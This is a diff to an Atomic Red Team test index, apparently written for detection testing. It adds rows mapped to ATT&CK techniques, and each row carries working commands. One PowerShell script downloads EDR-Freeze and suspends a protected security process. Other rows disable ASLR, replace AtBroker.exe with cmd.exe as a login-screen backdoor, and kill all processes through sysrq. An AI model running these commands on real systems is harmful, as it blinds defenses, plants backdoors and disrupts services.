@@ -2828,6 +2828,157 @@ input_arguments.ETWProviderGUID.default: {B6D775EF-1436-4FE6-BAD3-9E436319E218}
 input_arguments.ETWProviderGUID.description: Microsoft-Windows-SenseIR ETW Provider GUID
 
 "
+T1562.001,Impair Defenses: Disable or Modify Tools,Freeze PPL-protected process with EDR-Freeze,cbb2573a-a6ad-4c87-aef8-6e175598559b,"This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",windows,,,"# Enable SeDebugPrivilege
+Add-Type -TypeDefinition @""
+using System;
+using System.Runtime.InteropServices;
+
+public class TokenAdjuster {
+    [DllImport(""advapi32.dll"", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport(""advapi32.dll"", SetLastError = true)]
+    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
+
+    [DllImport(""advapi32.dll"", SetLastError = true)]
+    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
+        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct TOKEN_PRIVILEGES {
+        public int PrivilegeCount;
+        public long Luid;
+        public int Attributes;
+    }
+
+    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
+    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+    public const uint TOKEN_QUERY = 0x0008;
+
+    public static bool EnableSeDebugPrivilege() {
+        IntPtr hToken;
+        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
+            return false;
+
+        long luid;
+        if (!LookupPrivilegeValue(null, ""SeDebugPrivilege"", out luid))
+            return false;
+
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
+        tp.PrivilegeCount = 1;
+        tp.Luid = luid;
+        tp.Attributes = SE_PRIVILEGE_ENABLED;
+
+        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+    }
+}
+""@
+
+$result = [TokenAdjuster]::EnableSeDebugPrivilege()
+if ($result) {
+    Write-Host ""SeDebugPrivilege enabled successfully."" -ForegroundColor Green
+} else {
+    Write-Host ""Failed to enable SeDebugPrivilege."" -ForegroundColor Red
+    exit 1
+}
+
+# Get basic process info
+$process = Get-Process -Name $#{processName} -ErrorAction Stop
+$processName = $process.ProcessName
+Write-Host ""Process Name: $processName)""
+Write-Host ""PID: $($process.Id)""
+        
+# Get executable path and user info
+$query = ""SELECT * FROM Win32_Process WHERE Name = '$processName.exe'""
+$wmiProcess = Get-WmiObject -Query $query
+
+$owner = $wmiProcess.GetOwner()
+    Write-Host ""User: $($owner.Domain)\$($owner.User)""
+
+
+# Get the folder of the current script
+$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition
+
+# Download latest EDR-Freeze package and extract (force replace)
+$downloadUrl = ""https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip""
+$zipPath = Join-Path $scriptFolder ""EDR-Freeze_1.0.zip""
+Write-Host ""Downloading latest EDR-Freeze from $downloadUrl"" -ForegroundColor Cyan
+try {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+    Write-Host ""Download completed: $zipPath"" -ForegroundColor Green
+    $extractFolder = $scriptFolder
+    if (Test-Path $zipPath) {
+        Write-Host ""Extracting archive to $extractFolder (overwriting existing files)"" -ForegroundColor Cyan
+        if (Test-Path $extractFolder) {
+            # Ensure target exe not locked; attempt to stop any running instance silently
+            Get-Process -Name ""EDR-Freeze_1.0"" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+        }
+        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null
+        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)
+        $archive = $null
+        try {
+            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
+            foreach ($entry in $archive.Entries) {
+                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }
+                if ($entry.FullName.EndsWith('/')) { # directory entry
+                    $dirPath = Join-Path $extractFolder $entry.FullName
+                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }
+                    continue
+                }
+                $destPath = Join-Path $extractFolder $entry.FullName
+                $destDir = Split-Path $destPath -Parent
+                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
+                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }
+                try {
+                    # Use static extension method (PowerShell 5.1 compatible)
+                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)
+                } catch {
+                    Write-Host ""Failed to extract entry $($entry.FullName): $_"" -ForegroundColor Yellow
+                }
+            }
+            Write-Host ""Extraction completed."" -ForegroundColor Green
+        } finally {
+            if ($archive) { $archive.Dispose() }
+        }
+    }
+} catch {
+    Write-Host ""Failed to download or extract EDR-Freeze: $_"" -ForegroundColor Red
+}
+
+# Wait 15s before putting targeted process before putting it in the comma
+Write-Host ""Waiting 15s before putting $processName in the comma"" -ForegroundColor Yellow
+Start-Sleep -Seconds 5
+Write-Host ""Waiting 10s before putting $processName in the comma"" -ForegroundColor Yellow
+Start-Sleep -Seconds 5
+Write-Host ""Waiting 5s before putting $processName in the comma"" -ForegroundColor Yellow
+Start-Sleep -Seconds 3
+Write-Host ""Waiting 2s before putting $processName in the comma"" -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+
+# Put targeted  process in the comma for 15s
+# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)
+$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |
+    Sort-Object LastWriteTime -Descending |
+    Select-Object -First 1 -ExpandProperty Name
+if (-not $edrFreezeExeName) {
+    Write-Host ""No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder"" -ForegroundColor Red
+    exit 1
+}
+
+$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName
+Write-Host ""Using EDR-Freeze executable: $edrFreezeExeName"" -ForegroundColor Cyan
+Write-Host ""$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)"" -ForegroundColor Yellow
+Start-Process -FilePath $edrFreezeExe -ArgumentList (""$($process.Id) 15000"") | Out-Null",powershell,True,,"Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue
+Write-Output ""File deleted: $edrFreezeExe""",,,"input_arguments.processName.type: string
+
+input_arguments.processName.default: SecurityHealthService
+
+input_arguments.processName.description: PPL-protected process name to target
+
+"
+T1562.001,Impair Defenses: Disable or Modify Tools,Disable ASLR Via sysctl parameters - Linux,ac333fe1-ce2b-400b-a117-538634427439,Detects Execution of the `sysctl` command to set `kernel.randomize_va_space=0` which disables Address Space Layout Randomization (ASLR) in Linux.,linux,,,"sysctl -w kernel.randomize_va_space=0
+",bash,True,,"sysctl -w kernel.randomize_va_space=2
+",,,
 T1558.002,Steal or Forge Kerberos Tickets: Silver Ticket,Crafting Active Directory silver tickets with mimikatz,385e59aa-113e-4711-84d9-f637aef01f2c,"Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
 The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
 ",windows,,,"Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
@@ -7304,8 +7455,7 @@ $p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force
 catch {
   Write-Warning ""Cleanup failed with error: $_""
 }
-",,"dependencies.0.description: Notepad must be present on the system
-dependencies.0.dependency_executor_name: command_prompt
+",command_prompt,"dependencies.0.description: Notepad must be present on the system
 dependencies.0.prereq_command: where notepad
 dependencies.0.get_prereq_command: 
 ","input_arguments.note_filename.description: File name for the simulated ransom note
@@ -14445,6 +14595,13 @@ icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
 copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
 ",command_prompt,True,,"copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
 ",,,
+T1546.008,Event Triggered Execution: Accessibility Features,Replace AtBroker.exe (App Switcher binary) with cmd.exe,210be7ea-d841-40ec-b3e1-ff610bb62744,"Replace AtBroker.exe (App Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt from the login screen by locking and then unlocking the computer after toggling on any of the accessibility tools in the Accessibility menu.
+",windows,,,"IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd )
+takeown /F C:\Windows\System32\AtBroker.exe /A
+icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t
+copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
+",command_prompt,True,,"copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
+",,,
 T1136.003,Create Account: Cloud Account,AWS - Create a new IAM user,8d1c2368-b503-40c9-9057-8e42f21c58ad,"Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time
 ",iaas:aws,,,"aws iam create-user --user-name #{username}
 ",sh,False,,"aws iam delete-user --user-name #{username}
@@ -19529,6 +19686,9 @@ input_arguments.service_name.type: string
 input_arguments.service_name.default: cron
 
 "
+T1489,Service Stop,Abuse of linux magic system request key for Send a SIGTERM to all processes,6e76f56f-2373-4a6c-a63f-98b7b72761f1,"Adversaries with root or sufficient privileges Send a SIGTERM to all processes, except for init. By writing 'e' to /proc/sysrq-trigger, they can forced kill all processes, except for init.
+",linux,,,"echo ""e"" > /proc/sysrq-trigger
+",bash,True,,,,,
 T1078.001,Valid Accounts: Default Accounts,Enable Guest account with RDP capability and admin privileges,99747561-ed8d-47f2-9c91-1e5fde1ed6e0,"After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
 and desktop will allow multiple RDP connections.
 ",windows,,,"net user #{guest_user} /active:yes
@@ -20663,9 +20823,9 @@ T1562.008,Impair Defenses: Disable Cloud Logs,AWS CloudWatch Log Stream Deletes,
 deleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html
 ",iaas:aws,,,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
 echo ""*** Log Group Created ***""
-aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}
+aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region}
 echo ""*** Log Stream Created ***""
-aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}
+aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region}
 echo ""*** Log Stream Deleted ***""
 aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
 echo ""*** Log Group Deleted ***""
@@ -21185,6 +21345,10 @@ input_arguments.cli_script.type: path
 input_arguments.cli_script.default: PathToAtomicsFolder\T1083\src\esxi_file_discovery.txt
 
 "
+T1083,File and Directory Discovery,Identifying Network Shares - Linux,361fe49d-0c19-46ec-a483-ccb92d38e88e,"If the system uses network file systems (e.g., NFS, CIFS), findmnt can help locate paths to remote shares.
+Attackers may then attempt to access these shares for lateral movement or data exfiltration.
+",linux,,,"findmnt -t nfs
+",sh,,,,,,
 T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on CentOS/RHEL,9c096ec4-fd42-419d-a762-d64cc950627e,"Creates a root CA with openssl
 ",linux,,,"openssl genrsa -out #{key_filename} 4096
 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
